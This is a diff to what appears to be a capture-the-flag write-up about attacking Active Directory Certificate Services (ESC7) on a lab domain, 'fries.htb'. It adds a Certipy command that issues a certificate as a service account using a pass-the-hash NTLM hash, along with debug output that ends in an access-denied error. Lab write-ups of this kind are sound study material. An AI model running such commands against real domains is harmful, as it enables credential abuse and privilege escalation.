@@ -1026,7 +1026,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ```
 
 I also have ManageCa rights, which means i should be able to add myself as an enrollee subject to templates
-## ESC7
+## ESC7 (Fila)
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca
 
@@ -1149,8 +1149,25 @@ Would you like to save the private key? (y/N): y
 Ill then submit a request and retrieve the key
 
 ```python
+certipy-ad ca  -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -ca fries-DC01-CA -target 10.129.244.72 -issue-request 45 -dc-ip 10.129.244.72 -dc-host dc01.fries.htb -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[+] Nameserver: '10.129.244.72'
+[+] DC IP: '10.129.244.72'
+[+] DC Host: 'dc01.fries.htb'
+[+] Target IP: '10.129.244.72'
+[+] Remote Name: '10.129.244.72'
+[+] Domain: 'FRIES.HTB'
+[+] Username: 'GMSA_CA_PROD$'
+[+] Trying to get DCOM connection for: '10.129.244.72'
+[-] Access denied: Insufficient permissions to issue certificate
 ```
+
+But i am getting an error, im still not sure on the exact reason, but its clear its not just as simple as exploiting ESC7
+
+However, since i have ManageCa i might be able to modify ADCS in some way
+
+
 
 
 
